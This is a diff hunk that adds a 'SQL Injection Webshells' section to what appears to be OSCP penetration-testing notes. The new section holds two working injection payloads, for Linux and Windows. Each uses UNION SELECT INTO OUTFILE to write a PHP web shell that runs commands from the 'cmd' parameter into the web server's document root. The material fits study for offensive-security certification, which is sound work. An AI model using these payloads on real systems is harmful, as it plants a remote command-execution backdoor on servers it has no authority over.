@@ -275,7 +275,13 @@ Using order by
 https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
 
 	 
+ SQL Injection Webshells
  
+     #Linux
+     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+     
+     #Windows
+     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
 	
 	
 	
